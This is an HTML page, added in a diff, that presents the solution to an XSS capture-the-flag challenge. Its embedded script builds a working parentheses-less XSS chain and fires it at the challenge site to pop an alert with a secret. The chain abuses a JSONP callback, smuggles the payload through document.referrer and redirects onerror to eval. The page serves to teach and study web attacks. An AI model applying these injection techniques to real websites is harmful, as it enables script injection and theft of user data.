@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>HHarder XSS Challenge | Solution</title>
+    <meta charset="utf-8">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="terjanq">
+    <meta name="twitter:title" content="XSS Challenge 2020-06 | Solution">
+    <meta name="twitter:description" content="Solution to XSS challenge from Masato Kinugawa">
+    <meta name="twitter:image" content="https://i.imgur.com/e0eE9RX.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/night-owl.min.css">
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/markdown-it/11.0.0/markdown-it.min.js"></script>
+    <link rel="preload" as="image" href="bg.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script src="misc.js"></script>
+   </head>
+
+<body>
+    <div id=intro class=window>
+        <span class=title>Intro</span>
+        <h1> Solution to <a target="_blank" href="https://harderxss.terjanq.me/harder">HHarder XSS challenge</a></h1>
+
+        <p>
+
+        <h2>The challenge</h2>
+
+        <details>
+            <summary>index.html</summary>
+            <pre><code class="language-html" id="codeHTML"></code></pre>
+        </details>
+        
+        <details>
+            <summary>harder.js</summary>
+            <pre><code class="language-js" id="codeJS"></code></pre>
+        </details>
+        <details>
+            <summary>/hof2?cb=displayHoF2&t=321&hmac=HMAC</summary>
+            <pre><code class="language-js" id="codeCB"></code></pre>
+        </details>
+        <h2>Writeup</h2>
+        <a target=_blank href="https://medium.com/@terjanq/arbitrary-parentheses-less-xss-e4a1cf37c13d">Arbitrary Parentheses-less XSS</a>
+        <h2>Solution</h2>
+        <button onclick=solve()>Execute the payload</button>
+    </div>
+
+    <div class=window>
+        <span class=title>Proof of Concept</span>
+        <pre class=main><code id=code class="language-html"></code></pre>
+    </div>
+
+    <div id=solution>
+        <!-- Force the page to send unsafe url to the challenge page -->
+        <meta name="referrer" content="unsafe-url">
+        <script>
+            const sleep = d => new Promise(r=>setTimeout(r,d));
+
+            async function solve(){
+
+                /* construct arbitrary XSS payload */
+                const cb = [
+                    "=1",
+                    "d=document.documentElement",
+                    "d.innerHTML=document.referrer",
+                    "d.innerHTML=d.innerText",
+                    "onerror=x.contentWindow.eval",
+                    "TypeError.prototype.name=x.title",
+                    "x.onload=atob",
+                    "json="
+                ].join('\u2028');
+
+                /* construct a valid HTML code, while making sure no characters
+                  are url encoded in the process */
+                const payload = 
+                `<iframe/id='x'src='%GG'title='-alert(top.json.secret);var/**/Uncaught//'>`
+                    .replace(/</g,'&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/'/g, '&quot;')
+
+                /* smuggle the payload in document.referrer */
+                history.pushState(null, null, "?"+payload);
+                await sleep(500);
+                location.assign("https://harderxss.terjanq.me/harder?t=1337%26cb="+cb);
+            };
+        </script>
+    </div>
+
+</body>
+
+</html>
